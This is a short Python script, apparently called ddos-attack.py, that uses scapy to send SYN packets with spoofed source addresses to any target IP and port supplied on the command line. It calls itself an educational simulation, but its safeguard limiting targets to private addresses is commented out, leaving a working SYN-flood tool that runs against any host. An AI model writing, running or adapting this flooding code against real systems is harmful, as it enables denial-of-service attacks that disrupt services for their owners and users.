import sys
import time
import random
# import ipaddress  
from scapy.all import *

# def privateIP(ip):
#     privateRanges = [
#         "10.0.0.0/8",
#         "172.16.0.0/12",
#         "192.168.0.0/16",
#     ]
#     try:
#         ip_obj = ipaddress.ip_address(ip)
#         for network in privateRanges:
#             if ip_obj in ipaddress.ip_network(network):
#                 return True
#         return False
#     except ValueError:
#         return False  

# def validIP(ip):
#     try:
#         ipaddress.ip_address(ip)  
#         return True
#     except ValueError:
#         return False

# def synFlood(srcIP, destIP, destPort, packetCount, delay=0.1):
def synFlood(destIP, destPort, packetCount, delay=0.1):
    print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
    print(f"[+] Target: {destIP}:{destPort}")
    print(f"[+] Sending {packetCount} packets with {delay}s delay\n")
    
    for i in range(1, packetCount + 1):
        srcIP = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")
        
        try:
            send(packet, verbose=0)
            print(f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)")
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    
    print("\n[✓] Simulation Complete")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python ddos-attack.py <destIP> <destPort> <packetCount>")
        print("Example: python ddos-attack.py 192.168.1.100 80 40")
        sys.exit(1)
    
    # srcIP = sys.argv[1]
    destIP = sys.argv[1]
    destPort = int(sys.argv[2])
    packetCount = int(sys.argv[3])
    
    # if not privateIP(destIP):
    #     print("[!] ERROR: Only private IP ranges allowed (10.x.x.x, 172.16.x.x, 192.168.x.x)")
    #     sys.exit(1)
    
    # if not validIP(destIP) and not validIP(srcIP):
    #     print("[!] ERROR: Only private IP ranges allowed (10.x.x.x, 172.16.x.x, 192.168.x.x)")
    #     sys.exit(1)
    # # else: print(validIP(destIP))
        
    # synFlood(srcIP, destIP, destPort, packetCount, delay=0.1)
    synFlood(destIP, destPort, packetCount, delay=0.1)
